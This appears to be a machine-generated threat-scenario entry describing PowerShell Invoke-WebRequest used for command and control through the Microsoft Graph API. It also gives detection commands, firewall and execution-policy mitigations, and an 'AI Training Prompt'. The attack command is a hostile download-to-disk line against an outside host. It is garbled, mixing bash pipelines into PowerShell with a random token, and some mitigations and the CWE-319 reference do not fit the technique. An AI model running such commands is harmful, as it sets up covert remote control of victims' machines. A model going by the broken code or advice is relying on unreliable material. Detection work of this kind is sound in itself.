---
type: campaign
scenario_id: 412
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using Invoke-WebRequest for C2 via Microsoft Graph API.

## Threat Description
Using Invoke-WebRequest for C2 via Microsoft Graph API.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://graph.microsoft.com/v1.0/me/drive/root:/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt:/content -Headers @{Authorization='Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)'} -OutFile C:\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt"
```

## Detection Logic
Monitor Invoke-WebRequest Graph: `wmic process where name='powershell.exe' get commandline | findstr graph.microsoft.com`; Network traffic: `tshark -Y 'http.host contains graph.microsoft.com'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block Microsoft Graph: `netsh advfirewall firewall add rule name='Block Graph' dir=out action=block remoteip=20.190.128.0/18`.

## AI Training Prompt
Train AI to detect Invoke-WebRequest C2 via Microsoft Graph API by analyzing HTTP headers, Graph API endpoints, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
